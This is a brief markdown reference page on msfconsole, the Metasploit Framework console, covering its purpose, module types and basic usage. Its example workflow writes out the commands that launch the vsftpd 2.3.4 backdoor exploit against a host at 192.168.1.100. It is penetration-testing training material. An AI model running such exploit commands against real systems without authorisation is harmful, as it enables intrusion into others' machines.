# msfconsole – Metasploit Framework Console Interface

**msfconsole** is the primary command-line interface to the **Metasploit Framework**, a powerful platform for developing, testing, and executing exploits against remote targets. It provides access to thousands of modules, including exploits, payloads, post-exploitation tools, scanners, and more.

## 🔍 What Is msfconsole?

- Core interface to the Metasploit Framework
- Supports scripting, automation, and interactive shell usage
- Enables launching exploits, creating payloads, and managing sessions
- Ideal for red teaming, pentesting, and vulnerability validation

## ⚙️ Basic Usage

```bash
msfconsole
```

Once inside the console, you can search, configure, and run modules interactively.

## 🧪 Example Workflow

```bash
msfconsole
```

```text
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.1.100
set RPORT 21
run
```

## 📦 Module Types

- `exploit/` – Attack modules
- `auxiliary/` – Scanners, fuzzers, etc.
- `payload/` – Shellcode and Meterpreter payloads
- `post/` – Post-exploitation tools
- `encoder/` – Payload obfuscation
- `nop/` – No-operation generators
